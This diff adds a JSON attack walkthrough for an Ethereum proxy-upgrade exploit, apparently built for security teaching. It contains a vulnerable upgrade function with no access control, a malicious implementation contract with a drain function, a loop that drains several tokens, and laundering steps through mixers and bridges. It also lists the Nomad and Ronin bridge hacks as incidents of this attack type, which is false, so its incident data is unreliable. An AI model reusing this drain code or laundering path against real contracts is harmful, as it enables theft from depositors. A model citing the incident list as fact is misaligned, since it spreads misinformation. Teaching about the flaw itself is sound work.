@@ -1,0 +1,99 @@
+{
+  "title": "Unauthorized Proxy Upgrade Attack",
+  "severity": "Critical",
+  "chain": "Ethereum",
+  "actors": ["Attacker", "Proxy", "Implementation", "AdminSlot"],
+  "incidents": [
+    {
+      "name": "Nomad Bridge",
+      "date": "2022-08-01",
+      "chain": "Ethereum",
+      "loss_usd": "$190M",
+      "contract": "0xB92336759618F55bd0F8313bd843604592E27bd8",
+      "tx_hash": "0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4813d4",
+      "block": 15259101,
+      "etherscan": "https://etherscan.io/tx/0xa5fe9d044e4f3e5aa5bc4c0709333cd2190cba0f4e7f16bcf73f49f83e4813d4"
+    },
+    {
+      "name": "Ronin Bridge",
+      "date": "2022-03-29",
+      "chain": "Ethereum",
+      "loss_usd": "$624M",
+      "attacker": "0x098B716B8Aaf21512996dC57EB0615e2383E2f96",
+      "tx_hash": "0xc28fad5e8d5e0ce6a2eaf67b6687be5d58a8c00e3c7b41fd87d8c0c6e16e40a0",
+      "block": 14442840,
+      "etherscan": "https://etherscan.io/tx/0xc28fad5e8d5e0ce6a2eaf67b6687be5d58a8c00e3c7b41fd87d8c0c6e16e40a0"
+    }
+  ],
+  "initial_state": {
+    "proxy_address": "0x1234...abcd",
+    "implementation": "LendingPoolV1 (legitimate)",
+    "admin_slot": "0x360894...storage slot",
+    "total_value_locked": "$50,000,000",
+    "upgrade_protection": "❌ Missing onlyAdmin modifier"
+  },
+  "steps": [
+    {
+      "step": 1,
+      "from": "Attacker",
+      "to": "Proxy",
+      "action": "upgradeToAndCall(maliciousImpl, '')",
+      "description": "Attacker discovers that the proxy's upgrade function lacks proper access control. The upgradeToAndCall function is externally callable by anyone, missing the critical onlyAdmin modifier that should restrict it to the proxy admin.",
+      "code": "// ⚠️ Vulnerable proxy — no access control on upgrade\nfunction upgradeToAndCall(\n    address newImplementation, \n    bytes memory data\n) external payable {\n    // Missing: require(msg.sender == _getAdmin())\n    _setImplementation(newImplementation);\n    if (data.length > 0) {\n        Address.functionDelegateCall(newImplementation, data);\n    }\n}",
+      "state_changes": {
+        "upgrade_caller": "⚠️ Attacker (not admin)",
+        "access_check": "⚠️ Bypassed — no modifier present"
+      }
+    },
+    {
+      "step": 2,
+      "from": "Proxy",
+      "to": "AdminSlot",
+      "action": "_setImplementation(maliciousImpl)",
+      "description": "The proxy writes the attacker's malicious implementation address into the EIP-1967 implementation storage slot (0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc). All future delegatecalls from the proxy will now execute the attacker's code.",
+      "code": "// EIP-1967 implementation slot gets overwritten\nbytes32 constant IMPL_SLOT = \n    0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;\n\nfunction _setImplementation(address impl) internal {\n    require(impl.code.length > 0, \"Not a contract\");\n    StorageSlot.getAddressSlot(IMPL_SLOT).value = impl;\n    // ⚠️ Implementation now points to attacker's contract\n}",
+      "state_changes": {
+        "implementation_slot": "⚠️ 0xDEAD...BEEF (malicious contract)",
+        "original_implementation": "⚠️ LendingPoolV1 (overwritten, unreachable)"
+      }
+    },
+    {
+      "step": 3,
+      "from": "Attacker",
+      "to": "Implementation",
+      "action": "initialize(attacker_address)",
+      "description": "The malicious implementation includes a drain function disguised as an initializer. Since delegatecall executes in the proxy's storage context, the attacker's code can access and manipulate all funds held by the proxy contract.",
+      "code": "// Attacker's malicious implementation\ncontract MaliciousImpl {\n    function initialize(address _owner) external {\n        // Runs in proxy's context via delegatecall\n        // Attacker becomes owner of proxy's storage\n        owner = _owner;\n    }\n\n    function drain(address token) external {\n        require(msg.sender == owner);\n        uint256 bal = IERC20(token).balanceOf(address(this));\n        IERC20(token).transfer(owner, bal);\n    }\n}",
+      "state_changes": {
+        "proxy_owner": "⚠️ Attacker (was: legitimate admin)",
+        "malicious_code": "⚠️ drain() function now accessible"
+      }
+    },
+    {
+      "step": 4,
+      "from": "Attacker",
+      "to": "Proxy",
+      "action": "drain(USDC), drain(WETH), drain(DAI)",
+      "description": "Attacker calls the drain function on the proxy, which delegatecalls to the malicious implementation. Since the proxy holds all protocol funds, the attacker transfers every token balance to their wallet. Multiple tokens are drained in sequence.",
+      "code": "// Attacker drains all assets through proxy\naddress[] memory tokens = [USDC, WETH, DAI, WBTC];\nfor (uint i = 0; i < tokens.length; i++) {\n    // Each call goes: Proxy → delegatecall → MaliciousImpl.drain()\n    IProxy(proxy).drain(tokens[i]);\n}\n// All $50M in TVL transferred to attacker",
+      "state_changes": {
+        "proxy_tvl": "⚠️ $0 (was $50,000,000)",
+        "attacker_balance": "💰 $50,000,000 in stolen tokens",
+        "protocol_status": "⚠️ Completely drained"
+      }
+    },
+    {
+      "step": 5,
+      "from": "Attacker",
+      "to": "Attacker",
+      "action": "laundering via Tornado Cash / bridge",
+      "description": "Attacker launders the stolen funds through mixing protocols and cross-chain bridges to obscure the trail. The protocol is left with an empty proxy pointing to malicious code. Recovery requires a new deployment and is typically impossible for the stolen funds.",
+      "code": "// Post-exploit: Attacker launders funds\n// 1. Swap all tokens to ETH on DEX\n// 2. Bridge to L2 / other chains\n// 3. Mix through privacy protocols\n\n// Protocol recovery options:\n// - Deploy new implementation (funds already gone)\n// - Pause proxy (too late)\n// - Community fund to compensate users",
+      "state_changes": {
+        "stolen_funds": "💰 $50,000,000 laundered",
+        "protocol_state": "⚠️ Irrecoverable — proxy compromised",
+        "user_deposits": "⚠️ Total loss for all depositors"
+      }
+    }
+  ]
+}
